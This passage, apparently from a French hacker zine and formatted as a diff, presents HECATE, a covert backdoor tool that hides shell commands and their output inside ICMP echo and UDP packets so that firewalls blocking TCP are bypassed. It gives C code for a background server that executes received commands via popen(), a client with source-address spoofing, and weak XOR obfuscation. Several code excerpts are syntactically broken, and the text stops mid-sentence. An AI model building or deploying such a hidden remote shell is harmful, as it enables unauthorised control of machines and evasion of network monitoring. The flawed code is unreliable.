@@ -1,0 +1,1443 @@
+-------------------------------------------------------------------------------
+X.	Projet HECATE v1.0,  ICMP/UDP based Tunneling Tool             neofox
+-------------------------------------------------------------------------------
+
+
+[ Introducion ]
+
+Voici enfin released notre petit joujou fait maison. Pas de quoi faire sauter
+une braguette me direz vous, j'en conviens, mais ça nous amuse, voila tout.
+Je prends la parole pour cet article nom de ceux qui ont de prés ou de loin
+participé à l'écriture du code. Ce fut, c'est, et ce sera un projet de groupe,
+mené par la communauté #ioc epiknet, l'occasion de travailler à plusieurs pour
+une fois, chacun sa contribution selon ses disponnibilités.  Si je signe ce
+texte de mon pseudo, c'est que c'est principalement moi qui vais rédiger cette
+présentation, mais je passerai de temps en temps la parole à mes camarades
+qui décriront certains points mieux que moi. Bref, cet article a pour vocation
+de présenter l'outil, de commenter les grandes lignes du code, et d'en décrire
+le fonctionnement, illustrations à l'appui. Attention, la version d'hecate
+commentée dans ce document n'est pas la plus à jour, puisque le code est encore
+en cours de préparation au moment de la rédaction de ce document. En revanche,
+90% du code n'aura pas changé, donc ce papier l'affaire pour ce qui d'en saisir
+les grandes lignes.
+
+
+[ Sommaire ]
+
+Part. I	   Présentation générale
+
+		1. le concept
+		2. bref rappel
+		3. le fonctionnement
+
+Part. II   Explication du code
+
+		1. les points clés
+		2. les fonctions d'hecate
+		3. le cryptage
+		4. client.c
+		5. server.c
+
+
+Part. III  Options, Syntaxe et Démonstration
+
+		1. les options
+		2. la syntaxe
+		3. démonstration
+
+
+Part. IV    Tests et Discussion
+
+		1. le dialogue PING/PONG
+		2. avec UDP
+		3. test sur eth0
+		4. cryptage
+		5. détection
+		6. Incrémentation
+
+ANNEXE:		hecate.v1.0.tar.gz
+
+
+
+
+
+
+
+
+
+		++++ | Part I.  Présentation Générale | ++++
+
+
+
+
+
+	1. Le Concept :
+	______________
+
+
+Hecate est un outil de tunneling, comprendre par là qu'il crée un tunnel de
+communication entre une programme serveur et un programme client. D'ordinaire,
+faire dialoguer client et serveur revient à travailler en mode connecté, donc
+en utilisant TCP pour le transport. Ici, il s'agit au contraire d'utiliser
+d'autres protocoles, en l'occurence ICMP ou UDP, pour transporter ce qui le
+serait normalement par TCP. L'avantage, c'est donc de pouvoir communiquer avec
+notre serveur alors que la machine sur laquelle il se trouve bloque le trafic
+TCP entrant. La communication client/serveur se résume à faire exécuter par le
+serveur les commandes que lui envoit le client. Dans un deuxième temps, le
+client reçoit du serveur le résultat de la commande exécutée, ce qui permet en
+somme d'avoir accès à un semblant de shell, en dehors de tout trafic TCP.
+La communication est bi-directionelle, j'aurais tout aussi bien pu dire que ça
+cirucle dans les deux sens, mais c'était l'occasion ou jamais de plaçer un
+mot intelligent =p . J'entends par la que non seulement le client emet une
+commande, mais aussi que serveur lui retourne une reponse, on ne travaille plus
+en aveugle.
+
+Avec Hecate vous pouvez donc, comme si vous vous trouivez sur un shell,
+executer vos commandes et recevoir l'affichage, via l'ICMP ou l'UDP au choix.
+Vous pouvez egalement modifier l'adresse source des paquets pour que votre
+adresse reelle n'apparaisse pas (vous attentez pas a une reponse du serveur
+dans ce cas), et tout ca, sans que notre activite circule en clair sur le
+reseau.
+
+Pour que la communication puisse s'établir via ICMP ou UDP, il faut injecter
+nos requettes directement dans les paqeutes côté client, et les y récupérer
+côté serveur, et inversemment pour le retour. Jettons un oeil aux protocols.
+
+
+
+
+
+	2. Bref Rappel :
+	________________
+
+
+On ne va pas s'étendre sur le fonctionnement de l'ICMP et de l'UDP, il y a les
+RFC pour ça, qui le feront d'ailleurs mieux que nous. Rapellons simplement à
+titre indicatif la structure des deux entêtes :
+
+
+
+0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1       0      7 8     15 16    23 24    31
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     +--------+--------+--------+--------+
+|Version|  IHL  |Type of Service|          Total Length         |     |       Port      |      Port       |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |      Source     |  Destinataire   |
+|         Identification        |Flags|      Fragment Offset    |     +--------+--------+--------+--------+
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |                 |                 |
+|  Time to Live |    Protocol   |         Header Checksum       |     |     Longueur    |    Checksum     |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     +--------+--------+--------+--------+
+|                       Source Address                          |     |              données ...          |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     +---------------- ... --------------+
+|                    Destination Address                        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Options                    |    Padding    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+Nous allons nous focaliser uniquement sur les types de datagrames et les
+champs qui nous intéressent dans le cadre du programme.
+
+[ ICMP ]
+
+Le permier champ est le champ "type". On ne s'intéresse qu'au trafic ICMP
+ECHO/ECHOREPLY, echo et réponse à echo, soient respectivement le type 8 et 0.
+Le second champ utile est "sequence", qui sert normalement à situer le
+datagrame dans une suite de ping. Quand vous pingez un hôte, le n° de sequence
+du permier PING de la série vaut 1, et c'est incrémenté pour chaque PING. Cela
+permet d'ordoner les datagrames, défois qu'un echo se perde en route.
+Le dernier champ que nous utiliserons, j'aurais peut-être du commençer par
+là, est le champ data. On s'interesse justement aux types 0 et 8 en raison de
+leur champ data dans lequel on va pouvoir insérer à l'aise tout ce que l'on veut.
+
+
+[ UDP ]
+
+Pas grand chose à dire, les champs source et dest, qui correspondent au n° de
+port duquel partira et auquel arrivera le datagrame. Les données viennent à la
+suite, on se serviera de ce champ de la même manière qu'avec celui d'ICMP.
+
+
+
+
+
+
+	3. Fonctionnement d'Hecate :
+	____________________________
+
+
+Une fois ce petit rappel fait, on peut discuter du fonctionnement de notre
+tunnel plus en détail. Le but est de pouvoir exécuter nos commandes à
+distance comme si on avait accès à un shell. On va camoufler nos commandes
+dans le trafic ICMP ECHO et UDP.
+
+
+[ Le Tunnel ]
+
+Hecate se compose donc d'une partie client et d'une partie serveur. Il crée
+une sorte de tunnel de communiquation entre elles deux, les commandes y etant
+envoyée a un bout et exécutées à l'autre bout, la réponse empruntant le chemin
+inverse. Le client saisit la commande qu'on lui passe, l'envoie au serveur camou-
+-flée dans un datagrame ICMP ou UDP. Le serveur qui écoutait le trafic ICMP et
+UDP entrant capte notre datagrame, en extrait la commande et l'exécute. La sortie
+de la commande (le listing d'un répertoire dans le cas d'un 'ls') est redirigée
+dans un buffer, on apellera ça l'affichage retour. Cet affichage retour est à son
+tour copié dans le champ données d'un datagrame réponse, qui est retourné au
+client. Enfin, le client qui écoutait lui aussi le trafic capte le datagrame
+réponse, en extrait l'affichage retour du champ données et l'écrit sur la
+sortie standard.
+
+
+
+
+
+
+[ Reperer nos datagrames ]
+
+Nos commandes parviennent au server parmi d'autres datagrames ICMP/UDP. Il en
+est de même pour le client. Le serveur ne doit traiter que les datagrames
+venant du client et vice versa. On a donc recours à une valeur spéciale des
+champs des headers pour identifer nos paquets (je devrais pas dire paquet mais
+datagrame parce qu'on raisonne au niveau de la couche IP là, mais ca fait trop
+de répétitions). Oui, donc on va coller un valeure spéciale à certains champs.
+Cette valeur spéciale sera 'magic_num'. Les tests réalisés plus bas ainsi que
+les explications qui vont suivre concidèrent le 'magic_num' par défaut, qui
+vaut 666  mais il est possible de lui attribuer une autre valeur par un argument
+du main. Notez que si vous spécifiéz un 'magic_num' en lançant le server, vous
+devez exécuter le client avec ce même 'magic_num' en paramètre. De la même
+manière, si vous utilisez le 'magic_num' par défaut coté serveur, le dialogue ne
+foncitonnera que si vous utilisez également le 'magic_num' par défaut coté client.
+
+Le dialogue client/serveur se passe comme suit :
+Lorsque le protocole utilisé est l'ICMP, le client envoit un PING avec la
+commmande au serveur, qui lui retourne un PONG avec l'affichage retour.
+Notre serveur ne devra tenir compte que du type ICMP_ECHO, et le client, que
+de l'ICMP_ECHOREPLY. Mais ça ne suffit pas, pour identifier correctement nos
+paquets. On va utiliser le champ sequence en lui attribuant le 'magic_num'.
+Ainsi, parmi l'ensmeble du trafic ICMP, nos datagames seront ceux ayant un
+seqnum particulier, par défaut 666. Ce qui donne un server en attente d'un
+type 8, seqnum à 666, et un client en attente d'un type 0, sequnum à 666 aussi.
+Nos paquets seront donc bien distingués  du reste des ICMPs, au risque de
+traiter par erreur le 666 ème paquet d'une session de ping ... mais ça doit
+pas arriver souvent =)
+
+Lorsque le protocole utilisé est l'UDP, on se base sur le port source duquel
+émane le datagrame. On attribue donc la valeur 'magic_num' au port source
+de nos datagrames. Le serveur est donc en attente d'un UDP provenant d'un
+port 666, pareil pour le client.
+
+Un exemple avec un UDP non spoofé. Pour les besoins de l'exemple, on utilise
+le 'magic_num' par défaut, et les données sont en clair, alors qu'en pratique
+c'est crypté :
+
+
+  CLIENT                                                                                                SERVER
+    |	  plaçe la commande                                                        extrait la commande     |
+    |->   dans le champ données						                  et l'exécute  <- |
+
+	->++++++++++++++++++++++++++                                    ++++++++++++++++++++++++++
+  UDP     + source=666 + dest=9238 + 					+ source=666 + dest=9238 +
+          ++++++++++++++++++++++++++					++++++++++++++++++++++++++
+ HEADER	  + len=8+cmd  +   cksum   +					+ len=8+cmd +   cksum    +
+        ->++++++++++++++++++++++++++					++++++++++++++++++++++++++
+  DATA	  +        "ls -al"        +					+        "ls -al"        +
+        ->++++++++++++++++++++++++++		                   	++++++++++++++++++++++++++
+
+		      |						                    |
+		      |-> ====================>>>>>>>>>>>>>>======================->|
+						TUNNEL UDP
+		      |<-=====================<<<<<<<<<<<<<<======================<-|
+		      |								    |
+	  ++++++++++++++++++++++++++					++++++++++++++++++++++++++
+	  + source=666 + dest=7546 +					+ source=666 + dest=7546 +
+	  ++++++++++++++++++++++++++					++++++++++++++++++++++++++
+	  + len=8+data +    cksum  +					+ len=8+data +    cksum  +
+	  ++++++++++++++++++++++++++					++++++++++++++++++++++++++
+	  + "drwx--x--x  10 fox   "+					+ "drwx--x--x  10 fox   "+
+	  ++++++++++++++++++++++++++					++++++++++++++++++++++++++
+
+    |->	    extrait l'affichage et					             plaçe l'afficahge   <-|
+    |       l'écrit sur la sortie standard	                                 dans le champ données     |
+  CLIENT                									         SERVER
+
+
+
+
+
+
+
+
+		++++ | Part II.  Explication du code | ++++
+
+
+Maintenant qu'on a decrit le fonctionnement general, et comment ce tool se
+sert des protocols pour faire passer nos commandes, on va s'interesse de plus
+pres au code.
+
+
+
+	1. Les points cles :
+	____________________
+
+Dans ce qui soit est abordé ce qu'il faut faire, ou ne pas faire,  ce qu'on a
+fait, et comment on l'a fait.
+
+
+[ L'allure generale ]
+
+Si on imprime le code source au format panneau publicitaire 2x3m, qu'on se
+recule d'une demi douzaine de metres, et qu'on le regarde, on voit que :
+
+	le client c'est enfait une grosse boucle while(1) qui sert a afficher
+le prompt. Dans cette boucle, on trouve les fonctions servant a envoyer le
+datagame et a la suite, on trouve une seconde boucle while(1) qui sert au
+client a ecouter le trafic entrant jusqu'a ce qu'une reponse lui parvienne.
+	le serveur, c'est simplement un grosse boucle while(1) lui aussi,
+avec laquelle il ecoute passivement dans l'attente d'une requete.
+
+
+
+
+[ Fonctions utiles ]
+
+Voici les fonctions indispensables pour ecrire ce genre d'outil :
+
+	o sendto() et recvfrom(): vu qu'on est en mode non connecte, c'est pas
+	recv() mais bien recvfrom(). Cherchez pas a ecrire/recevoir sur votre
+	socket a l'aide de write/read, vous perdirez du temps.
+
+	o popen(): celle la, si tu la connais pas tu peux pas l'inventer. Elle
+	est geniale pour l'affichage retour cette fonction. Elle execute la
+	commande passee en argument et invoque le shell. Grace a elle, on peut
+	recuperer la sortie de la commande. On s'est fait vraiemment chier Ciel
+	et moi meme avec des pipe(), fork(), dup(), dup2(), pour arriver a un
+	resultat similaire, avant de decouvrir popen() par hasard enconlustant
+	le manuel.  popen() est a utiliser avec pclose().
+
+
+C'est à peu prés tout, les autres fonctions sont classiques. On peut aussi
+utiliser select() pour faire joli, et fixer un timeout sur la socket sur
+laquelle on écoute, voir la fonction timeout() dans hecate.h.
+
+
+
+
+
+	2. Les fonctions d'hecate :
+	___________________________
+
+
+Voici dabord une descriptions des principales fonctions de hecate.h, seules
+les plus intéressantes seront détaillés plus bas :
+
+
+	o go_background() 	cache le serveur en arrière plan.
+	o proc_data()		exécute la commande grace à popen().
+	o do_crypt()		encrypte/décrypte les données transmises.
+ 	o open_socket()		importante fonction, détaillée plus bas.
+	o lookup()		pour la résolution de l'adresse de desitnation.
+	o timeout()		clos la socket si aucun paquet n'arrive à temps.
+	o make_checksum()	rippée de chez rippée, c'est l'usage avec cette fonction
+	o send_ICMP()		probablement la plus intéressante avec send_UDP().
+ 	o send_UDP()		quand on parle du loup ...
+	o send_pizza()		hahahaha, je vous ai déja fait le coup non ? =)
+
+
+
+
+
+
+
+[ proc_data() ]
+
+Sa syntaxe : int proc_data(char *cmd, char *buf).
+Cette fonction est utilisé par le server pour exécuter les commandes du
+client. proc_data() exécute 'cmd', écrit la sorite dans 'buf', et retourne
+le nombre d'octets constituant la sortie de la commande.
+
+Pour ce faire, on utilise popen() qui exécute la commande et retourne un fd de
+type FILE. On lit dans 'buf' depuis ce fd, et on retourne i, étant le nombre
+d'octets lus dans le flux.
+
+	memset(buf, '\0', DATA_SIZE);
+	if((fd = popen(cmd, "r")) != NULL){
+		i = fread(buf, 1, DATA_SIZE, fd);
+		buf[DATA_SIZE]='\0';
+	}
+
+	pclose(fd);
+	return i;
+
+Au passage écrase à chaque appel avec memset() le contenu du buffer pointé par
+'buf' pour que celui-cî ne contienne pas de données résiduelles lors du prochain
+appel, ce qui risquerait de perturber l'afficahge retour.
+
+
+
+
+
+[ open_socket() ]
+
+Sa syntaxe : int open_socket(int spoof, int proto).
+Cette fonction crée une socket utilisée par send_ICMP et send_UDP pour
+émettre les datagrams. Elle prend en paramètre la variable spoof et le
+numéro du protocol auquel est destiné la socket, et retourne un file
+descriptor.
+
+
+Si spoof vaut 0, on ne spoofe pas l'adresse source, et on laisse remplir
+le header IP par le kernel. On se contente donc d'ouvrir en SOCK_RAW et
+on précise le protocol, IPPROTO_ICMP ou IPPROTO_UDP selon que proto valle
+1 ou 17.
+
+	if(!spoof)
+	{
+       		if((fd = socket(AF_INET, SOCK_RAW, proto)) < 0)
+		return -1;
+	}
+
+
+Si spoof vaut 1, on va forger nous même l'entête IP. On ouvre donc la socket
+en SOCK_RAW et IPPROTO_RAW, et utilise setsockopt() pour avertir le kernel
+que le header IP est inclus dans les données (IP_HDRINCL pour IP Header
+INCLude).
+
+	else
+	{
+		if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+			return -1;
+
+		on++;
+		if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
+			return -1;
+
+	}
+
+	return fd;
+
+
+
+
+[ send_ICMP() et send_UDP() ]
+
+La fonction send_ICMP() est utilisée à la fois par le client et par le server
+pour envoyer un datagrame ICMP. Le client l'utilise pour émettre un ICMP_ECHO
+et par le serveur pour envoyer un ICMP_ECHOREPLY. Cette fonction forge le header
+ICMP et le header IP si le mode spoofing  est demandé.
+
+int send_ICMP(int type, u_long dest_addr, u_long src_addr, char *data, int spoof)
+
+	o type: le type d'ICMP à envoyer, 0 ou 8.
+	o data: les donnés à joindre au datagrame.
+	o spoof: l'option spoofing (1 = activé).
+
+
+
+
+On commençe par ouvrir une socket avec comme protocol IPPROTO_ICMP :
+
+	if((sock = open_socket(spoof, 1)) == -1){
+			perror("open_socket()");
+			return -1;
+			exit(1);
+	}
+
+
+Si spoof vaut 1, on renseigne les champs du header IP, et on indique 'src_addr'
+comme adresse source. Dans tous les cas, on remplit le header ICMP en collant
+au seqnum la valeur 'magic_num', puis on copie nos données à la suite de l'entête :
+
+
+	/* ICMP HEADER */
+	my_icmp->type = type;
+	my_icmp->un.echo.sequence = htons(magic_num);
+	my_icmp->checksum = 0;
+
+	/* DATA */
+	memcpy(my_data, data, strlen(data));
+
+
+On terminera en envoyant le paquet ainsi construit avec sendto().
+
+La fonction send_UDP() est analogue à la précédente, sauf qu'elle prend comme
+paramètre 'dest_port' et 'src_port' à la place du parapètre 'type'. 'dest_port'
+et 'src_port' sont les ports source et de destination du datagrame UDP.
+'dest_port' peut avoir une valeur aléatoire, ou une valeur fixée par l'option
+'-d<dest_port>' du main. Le paramètre 'src_port' vaut 'magic_num', et permet
+au client et au serveur d'identifer les paquets qu'ils s'enoient l'un l'autre.
+
+
+	/* ICMP HEADER */
+	my_udp->dest = htons(dest_port);
+	my_udp->source = htons(src_port);
+	my_udp->len = strlen(data) + sizeof(struct udphdr);
+
+	/* DATA */
+	memcpy(my_data, data, strlen(data));
+
+
+
+
+
+	3. Le cryptage :
+        ________________
+
+
+J'apelle ça cryptage, c'est enfait un XOR effectué bits à bits, une première fois
+sur nos donnes en clair, et puisque c'est une opération réversible, une seconde fois
+sur les données cryptées. J'ai appris par la même occasion le fonctionnement de XOR
+que je ne conaissait pas avant ça, mais pour ce qui est d'en parler plus en détails,
+je laisse la parole à un certain anonymous pour les explications :
+
+
+
+[ Choix d'une bonne clé ]
+
+La clé doit etre sur un byte.
+Elle doit avoir une bonne alternance entre 0 et 1 dans son écriture binaire,
+pour que le résultat crypté soit le plus différent possible de la donné a
+crypter. (bien que ce ne soit pas tout a fait exact car il faudrais prendre a
+considération la frenquence d'utilisation des caractères utilisé)
+Ensuite il ne faut SURTOUT PAS que la clé soit égale a un nombre qui peut etre
+envoyé par le client, ex un caractère. Si la clé est egale a 0x73 lors du cryptage
+d'un 's' le résultat de ce cryptage devient 0x00 et je pense que va pauser de
+gros problèmes de produire un ou des 00. En regardans la table ascii il faut
+que la clé fasse minimum 0x7F ou 127.
+
+
+1010 0101
+   A    5
+
+Je pense que 0xA5 ou 165(décimal) ferais une bonne clé ou tout
+autre nombre du meme genre.
+
+
+
+[ do_crypt() ]
+
+C'est la petite fonction de cryptage d'hecate.h. On l'utilise à la fois pour
+encoder et décoder, vu qu'elle est réversible. Elle prend pour argument un
+pointeur vers les données en clair et données en clair, et un pointeur vers
+un buffer qui contiendra les données encodées.
+
+
+void
+do_crypt(char *data, char *result)
+{
+	int i;
+	memset(result, '\0', strlen(result));
+	for(i=0; i<strlen(data); i++){
+		if(data[i] != '\x00')
+			result[i] = data[i] ^ CRYPTKEY;
+	}
+}
+
+
+Avec le memset, on écrase le contenu du buffer pointé par 'result' qui
+peut contenir les données encodées lors d'un précédent appel à do_encrypt().
+
+
+
+
+
+	4. Le Client :
+	______________
+
+Nous venons de commenter rapidement les fonctions de hecate.h et le cryptage,
+on va maintenant regarder le code du client, pour voir comment ces fonctions
+sont apellées. On s'arretera simplement sur  les parties les plus importantes,
+le code étant beaucoup commenté :
+
+
+
+
+On crée un prompt pour faire joli, et on récupère dabord la commande en clair
+avec fgets depuis l'entrée standard :
+
+-------8<-----------------------------------------------------------------------
+	/* prompt */
+	c=1;
+	while(1)
+	{
+		/*
+		 * invite de commande
+		 */
+		prompt:
+		printf("%s%s ~%d%s%s ", COLORON, PROMPTNAME, c++, PROMPT, COLOROFF);
+
+
+		/*
+		 * saisie de la commande
+		 * entrée au prompt
+		 */
+		if((fgets(clear_cmd, CMD_SIZE, stdin)) == NULL){
+			perror("getting clear_cmd");
+			exit(0);
+		}
+
+-------8<-----------------------------------------------------------------------
+
+On vérifie ensuite si la commande saisie est destinée à être exécuter à distance,
+ou bien au contraire si elle sert à manipuler localement le client. Une fois fait,
+on a plus besion de la commande en clair, on peut donc la crypter :
+
+-------8<-----------------------------------------------------------------------
+		/*
+		 * menu d'aide disponible au prompt
+		 */
+		if(strstr(clear_cmd, HELPME) != NULL){
+			helpme();
+			goto prompt;
+		}
+
+
+		/*
+		 * pour fermer le client proprement
+		 */
+		if(strstr(clear_cmd, QUITMSG)!=NULL)
+			quit(sent, recv);
+
+
+		/*
+		 * cyptage de la commande
+		 * à envoyer
+		 */
+                do_crypt(clear_cmd, crypted_cmd);
+
+-------8<-----------------------------------------------------------------------
+
+
+
+
+On vérifie le protocole qui a été demandé, qui est soit l'ICMP soit l'UDP.
+Si c'est de l'ICMP on envoit le datagrame avec send_ICMP. On veut envoyer
+un PING, on on passe en argument un type 8 ICMP_ECHO. On précise la valeur
+du seqnum qui sera notre 'magic_num'. On lui passe aussi les adresses source
+et de destination, la commande crypté, la taille du datagarme commande comprise
+et la variable 'spoof', qui vaut 0 par défaut. Si le client a été exécuté avec
+l'option 's', alors l'adresse source est spoofée et on a  incrémenté 'spoof' si
+vaut alors 1. Si spoof vaut 0, send_ICMP demandera à open_socket() d'ouvrir une
+socket avec IPPROTO_ICMP, et si spoof vaut 1, avec IPPROTO_RAW.
+
+-------8<-----------------------------------------------------------------------
+
+	/*
+	 * On utilise l'ICMP
+	 */
+	if(proto == IPPROTO_ICMP)
+	{
+		size = sizeof(struct icmphdr) + strlen(crypted_cmd);
+		if((send_ICMP(8, magic_num, server_addr, client_addr, crypted_cmd, spoof));
+	}
+
+-------8<-----------------------------------------------------------------------
+
+
+
+Si le protocole demandé est UDP, on utilise send_UDP et on lui passe en argument,
+le port de destination, qui est soit aléatoire soit spécifié par l'option '-d',
+le port source, qui est enfait notre 'magic_num', les adresses source et de
+destination, la commande cryptée, la taille, et 'spoof', 0 ou 1.
+
+-------8<-----------------------------------------------------------------------
+
+	/*
+	 * Sinon, on utilise
+	 * l'UDP
+	 */
+	if(proto == IPPROTO_UDP)
+	{
+		size = sizeof(struct udphdr) + strlen(crypted_cmd);
+		send_UDP(dest_port, src_port, server_addr, client_addr, crypted_cmd, spoof));
+
+	}
+
+
+
+-------8<-----------------------------------------------------------------------
+
+
+
+Si le mode spoofing a été demandé, on vient d'envoyer un datagrame avec une
+fausse adresse source, donc la réponse du serveur ne nous parviendra pas à
+nous mais à cette adresse, si elle existe. C'est donc inutile d'attendre un
+datagrame réponse, donc on rebalance un prompt.
+Sinon, on ouvre une boucle while(1). On onvre une socket SOCK_PACKET sur
+laquelle on place un timeout, et on attend une réponse avec recvfrom() :
+
+-------8<-----------------------------------------------------------------------
+
+	if(spoof) goto prompt;
+
+	/*****************************
+	 * CLIENT WAITING FOR A REPLY
+	 *****************************/
+	while(1)
+	{
+
+		sock_recv = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL)));
+
+		if(timeout(delay, sock_recv) == -1)
+				break;
+
+		/* pointeur sur le header IP */
+		ip_recv = (struct iphdr *)(packet_to_recv + sizeof(struct ethhdr));
+
+		bzero(&packet_to_recv, PACKET_SIZE);
+		bytes = recvfrom(sock_recv, (char *)&packet_to_recv, PACKET_SIZE, 0, 0, 0);
+
+-------8<-----------------------------------------------------------------------
+
+
+Si le paquet reçu est un ICMP, on déclare un pointeur sur l'entête ICMP.
+Si c'est un ICMP_ECHOREPLY avec le bon n° de sequence, on déclare un pointeur
+sur les données qui suivent. Si les données sont vides, il n'y a pas d'affichage
+retour. Sinon, on décrypte les données et on affiche ça sur la sortie standard :
+
+-------8<-----------------------------------------------------------------------
+
+	/***********************
+	 * DEAL WITH ICMP DGRAM
+	 ***********************/
+	if(ip_recv->protocol == IPPROTO_ICMP)
+	{
+		icmp_recv = (struct icmphdr *)(packet_to_recv  + sizeof(struct ethhdr) + 20);
+
+		if(icmp_recv->type == 0 && icmp_recv->un.echo.sequence == htons(magic_num))
+		{
+			data_recv = (char *)(packet_to_recv + sizeof(struct ethhdr) + 28));
+			if(!strlen(data_recv)){
+				fprintf(stdout,"%s", NODATA);
+				goto end;
+			}
+
+			do_crypt(data_recv, clear_data);
+			write(1, clear_data, strlen(clear_data));
+		}
+	}
+
+-------8<-----------------------------------------------------------------------
+
+La démarche est identique avec UDP, sauf qu'on contrôle le port source pour
+vérifier que ce soit bien nôtre paquet. Voila pour le client.
+
+
+
+
+
+	5. Le Serveur :
+	_______________
+
+
+Reste à décrire brièvement le code du serveur. Les étapes peuvent se
+résumer ainsi :
+
+		- on écoute et on reçoit
+		- si c'est notre paquet, on ouvre
+		- on récupère la commande
+		- on la décrypte
+		- on l'exécute en on récupère l'affichage
+		- on le crypte
+		- on le colle dans le champ données
+		- et on envoit le paquet réponse
+
+
+
+
+-------8<-----------------------------------------------------------------------
+
+
+
+	/*******************************
+	 * SERVER WAITING FOR A REQUEST
+	 *******************************/
+	while(1)
+	{
+
+		sock_recv = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
+		recvfrom(sock_recv, (char *)&packet_to_recv, PACKET_SIZE, 0, 0, 0);
+
+		ip = (struct iphdr *)(packet_to_recv + sizeof(struct ethhdr));
+
+
+-------8<-----------------------------------------------------------------------
+
+
+
+Si on reçoit un ICMP_ECHO avec le bon seqnum, on récupère dabord les adresses
+source et de destination. L'adresse source peut être spoofée. 0n décrypte la
+commande, on l'exécute, on encrypte l'affichage retour qu'on copie dans le champ
+donnés d'un ICMP_ECHOREPLY et on renvoit à l'adresse source :
+
+-------8<-----------------------------------------------------------------------
+
+	if(ip->protocol == IPPROTO_ICMP)
+	{
+		icmp = (struct icmphdr *)(packet_to_recv + sizeof(struct ethhdr) + 20);
+		data = (char *)(packet_to_recv + sizeof(struct ethhdr) + 20 + 8));
+
+		if(icmp->type == ICMP_ECHO && icmp->un.echo.sequence == htons(magic_num))
+		{
+			client_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->saddr));
+			server_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->daddr));
+
+
+			/* decrypte */
+			do_crypt(data, clear_cmd);
+
+			/* exécute */
+			if((proc_data(clear_cmd, clear_data)) == -1)
+				goto end;
+
+			/* encrypte */
+			do_crypt(clear_data, crypted_data);
+
+			send_ICMP(ICMP_ECHOREPLY, magic_num, client_addr, server_addr, crypted_data, 0);
+		}
+	}
+
+-------8<-----------------------------------------------------------------------
+
+
+
+On a envoyé un type ICMP_ECHOREPLY et on met l'argument 'spoof' à 0, car on n'a
+besion de spoofer l'adresse source dans ce cas de figure.
+On procède de la même manière pour traiter un datagrame UDP. Dabord on controle
+le pour source, et s'il correspond à notre 'magic_num', on extrait la commande,
+on décrypte etc ...
+
+-------8<-----------------------------------------------------------------------
+
+	if(ip->protocol == IPPROTO_UDP)
+	{
+ 		udp = (struct udphdr *)(packet_to_recv + sizeof(struct ethhdr) + 20);
+		data = (char *)(packet_to_recv + sizeof(struct ethhdr) + 20 + 8);
+
+
+		if(udp->source == htons(magic_num))
+		{
+			client_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->saddr));
+			server_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->daddr));
+
+			do_crypt(data, clear_cmd);
+
+			proc_data(clear_cmd, clear_data)) == -1);
+
+			do_crypt(clear_data, crypted_data);
+
+			reply_size = sizeof(struct udphdr) + strlen(crypted_data);
+			send_UDP(random(), magic_num, client_addr, server_addr, crypted_data, reply_size, 0));
+		}
+	}
+
+-------8<-----------------------------------------------------------------------
+
+Voila pour le serveur. Afin d'aller directement à l'essentiel, le code du
+client et du serveur décrit cï-dessus a été épuré, j'ai supprimé la gestion
+des erreurs des fonctions et les printf qui affichent les caractéristiques
+des paquets reçus.
+
+
+
+
+
+
+
+
+
+
+
+		++++ | Part III.   Options, Syntaxe et Démonstration | ++++
+
+
+
+	1. Options :
+	____________
+
+
+[ Options du Client ]
+
+Voici la liste des options donnée par le menu d'aide du client
+
+neolab# ./client -h
+-+ ICMP/UDP Crypted Tunnel - IOC Team, 2003 +-
+[-h]		displays this help
+-p<icmp/udp>	protocol to use
+-t<target>	server address
+[-v]		verbose mode
+[-s]<spoof>	source address, must be an IP
+[-d]<port>	destination port, for UDP dgrams
+[-m]<magic_num>	recognize our dgrams, default is 666
+[-w]<delay>	dealy before timeout, in sec
+neolab#
+
+
+usage: ./client [-vh] -p<icmp/udp> -t<dest_addr>
+	[-s<src_ip>] [-d<dest_port>] [-m <magic_num>] [-w <delay>]
+
+
+
+	o L'option -t<target> désigne l'adresse de la machine sur
+laquelle tourne le server. 'target' peut être un nom d'hôte ou une
+adresse IP.
+
+
+	o L'option -s<spoof> est l'IP source avec laquelle on
+souhaite envoyer nos datagrames. Ce doit être une IP et non un
+nom d'hôte, car il n'y a pas de fonction lookup portant sur cette
+adresse. Si le mode spoofing est activé, le client ne reçevra pas
+de réponse du server, on travaillera en aveugle dans ce cas.
+
+
+	o L'option -d<port_dest> permet de fixer le port UDP auquel
+envoyer nos datagrames. Evidemment, cette option n'est valide que
+si le protocole spécifé est UDP.
+
+
+	o L'option -p<protocol> spécifie le protocole à utiliser
+pour le transport de nos données. Ca peut être 'icmp' ou 'udp', ou
+bien le numéro du protocol, à savoir '1' ou '17'.
+
+
+	o L'option -m<magic_num> permet de fixer ... le magic_num !
+En clair, le magic_num est la valeur qui sera attribuée comme port
+source à nos datagrames UDP et comme seqnum à nos datagrames ICMP.
+De même, le client s'attendra à recevoir des datagrames UDP ayant
+comme port source 'magic_num' et des ICMP ayant 'magic_num' comme
+numéro de séquence. Si vous attribuez un magic_num au client, vous
+devrez spécifier le même lors de l'exécution du serveur. Si vous
+ne précisez rien, le magic_num par défaut sera utilisé.
+
+
+	o L'option -w<delay> fixe la durée en secondes pendant
+laquelle le client doit attendre une réponse du serveur. Si aucun
